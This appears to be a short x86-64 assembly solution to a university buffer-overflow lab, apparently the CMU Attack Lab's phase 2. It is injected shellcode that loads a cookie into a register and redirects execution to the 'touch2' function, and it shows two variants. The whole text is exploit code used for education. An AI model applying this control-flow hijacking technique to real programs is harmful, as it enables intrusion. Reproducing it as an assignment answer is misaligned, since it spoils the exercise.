mov $0x59b997fa, %rdi   /* Move the cookie value into %rdi */
push $0x4017ec          /* Push the address of the touch2 onto stack */
ret                     /* Pop the address of the stack and jump there */

/* Another method */
mov $0x59b997fa, %rdi   /* Move the cookie value into %rdi */
mov $0x4017ec, %eax
jmp %rax
